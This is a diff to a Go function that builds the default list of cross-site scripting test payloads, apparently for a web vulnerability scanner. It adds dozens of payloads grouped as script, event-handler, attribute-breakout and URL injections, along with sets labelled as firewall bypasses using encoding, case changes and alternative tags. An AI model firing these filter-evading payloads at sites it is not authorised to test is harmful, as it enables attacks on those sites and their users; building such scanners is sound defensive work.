@@ -96,26 +96,73 @@ func getTestPayloads(waf string, config *PayloadConfig, testAll bool) []string {
 	} else {
 		// Default: only high-success-rate payloads
 		highRate := []string{
-			// Basic script injection
+			// === Basic script injection ===
 			`<script>alert(1)</script>`,
 			`"><script>alert(1)</script>`,
 			`'><script>alert(1)</script>`,
-			// Event handler injection
+
+			// === Event handler injection ===
 			`<img src=x onerror=alert(1)>`,
 			`"><img src=x onerror=alert(1)>`,
 			`<svg onload=alert(1)>`,
 			`"><svg onload=alert(1)>`,
-			// JavaScript context
+
+			// === JavaScript context (no <> needed) ===
 			`alert(1)`,
 			`'-alert(1)-'`,
 			`"-alert(1)-"`,
 			`${alert(1)}`,
-			// HTML injection
-			`<details open ontoggle=alert(1)>`,
-			`<body onload=alert(1)>`,
-			// DOM specific
+			`;alert(1);`,
+			`}alert(1);{`,
+
+			// === Attribute breakout (no <> needed if already in attribute) ===
+			`" onmouseover="alert(1)`,
+			`' onmouseover='alert(1)`,
+			`" autofocus onfocus="alert(1)`,
+			`" onclick="alert(1)`,
+
+			// === URL-based (no <> needed) ===
 			`javascript:alert(1)`,
 			`data:text/html,<script>alert(1)</script>`,
+			`javascript:void(alert(1))`,
+
+			// === WAF bypass: encoding ===
+			`&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
+			`%3Cscript%3Ealert(1)%3C/script%3E`,
+			`\x3cscript\x3ealert(1)\x3c/script\x3e`,
+			`<script>alert(1)</script>`,
+
+			// === WAF bypass: alternative syntax ===
+			`<img/src=x/onerror=alert(1)>`,
+			`<svg/onload=alert(1)>`,
+			`<script>alert(1)//`,
+			`<script>alert(1)</script `,
+			`<ScRiPt>alert(1)</sCrIpT>`,
+			`<IMG SRC=x ONERROR=alert(1)>`,
+
+			// === WAF bypass: no parentheses ===
+			"<script>alert`1`</script>",
+			`<script>alert&#40;1&#41;</script>`,
+			"<img src=x onerror=alert`1`>",
+
+			// === WAF bypass: no alert keyword ===
+			`<script>confirm(1)</script>`,
+			`<script>prompt(1)</script>`,
+			`<script>console.log(1)</script>`,
+			`<img src=x onerror=confirm(1)>`,
+			`<img src=x onerror=prompt(1)>`,
+
+			// === WAF bypass: alternative tags ===
+			`<details open ontoggle=alert(1)>`,
+			`<body onload=alert(1)>`,
+			`<video src=x onerror=alert(1)>`,
+			`<audio src=x onerror=alert(1)>`,
+			`<marquee onstart=alert(1)>`,
+			`<input onfocus=alert(1) autofocus>`,
+			`<select onchange=alert(1)><option>1</option><option>2</option></select>`,
+			`<textarea onfocus=alert(1) autofocus>`,
+			`<keygen onfocus=alert(1) autofocus>`,
+			`<isindex type=image src=x onerror=alert(1)>`,
 		}
 		result = append(result, highRate...)
 
